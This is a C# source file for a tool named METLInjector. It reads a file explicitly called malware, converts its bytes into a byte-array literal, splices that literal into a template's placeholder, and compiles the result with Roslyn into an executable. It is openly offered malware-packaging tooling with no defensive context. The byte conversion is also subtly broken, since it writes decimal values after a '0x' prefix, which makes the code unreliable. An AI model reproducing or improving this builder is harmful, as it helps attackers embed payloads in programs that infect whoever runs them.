using System;
using System.Collections.Generic;
using System.Diagnostics.CodeAnalysis;
using System.IO;
using System.Linq;

using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.Extensions.DependencyModel;

namespace METL
{
    public class METLInjector
    {
        private static string GenerateCodeFromBytes(byte[] fileBytes)
        {
            var malwareSourceCode = "byte[] malSource = {";

            var array = new List<string>(fileBytes.Length);

            foreach (var fileByte in fileBytes)
            {
                array.Add($"0x{fileByte}");
            }

            return malwareSourceCode + string.Join(",", array) + "};";
        }

        private static byte[] CompileCodeToBytes(string sourceCode)
        {
            var options = CSharpParseOptions.Default.WithLanguageVersion(LanguageVersion.CSharp9);

            var parsedSyntaxTree = SyntaxFactory.ParseSyntaxTree(sourceCode, options);

            var references =
                DependencyContext.Default.CompileLibraries
                    .SelectMany(cl => cl.ResolveReferencePaths())
                    .Select(asm => MetadataReference.CreateFromFile(asm))
                    .ToList();

            var tempFile = Path.GetTempFileName();

            var result = CSharpCompilation.Create("METL",
                new[] { parsedSyntaxTree },
                references: references,
                options: new CSharpCompilationOptions(OutputKind.ConsoleApplication,
                    optimizationLevel: OptimizationLevel.Release,
                    assemblyIdentityComparer: DesktopAssemblyIdentityComparer.Default)).Emit(tempFile);

            if (result.Success)
            {
                var bytes = File.ReadAllBytes(tempFile);

                File.Delete(tempFile);

                return bytes;
            }

            if (File.Exists(tempFile))
            {
                File.Delete(tempFile);
            }

            var failures = result.Diagnostics.Where(diagnostic => diagnostic.IsWarningAsError || diagnostic.Severity == DiagnosticSeverity.Error);

            foreach (var diagnostic in failures)
            {
                Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
            }

            return null;
        }

        public static byte[] InjectMalwareFromFile([NotNull] string sourceFileName, [NotNull] string malwareFileName)
        {
            if (string.IsNullOrEmpty(sourceFileName))
            {
                throw new ArgumentNullException(sourceFileName);
            }

            if (string.IsNullOrEmpty(malwareFileName))
            {
                throw new ArgumentNullException(malwareFileName);
            }

            if (!File.Exists(sourceFileName))
            {
                throw new FileNotFoundException(sourceFileName);
            }

            if (!File.Exists(malwareFileName))
            {
                throw new FileNotFoundException(malwareFileName);
            }

            var sourceCodeFileText = File.ReadAllText(sourceFileName);

            var malwareBytes = File.ReadAllBytes(malwareFileName);

            var malwareCodeFileText = GenerateCodeFromBytes(malwareBytes);

            sourceCodeFileText = sourceCodeFileText.Replace("[PLACEHOLDER]", malwareCodeFileText);

            return CompileCodeToBytes(sourceCodeFileText);
        }
    }
}
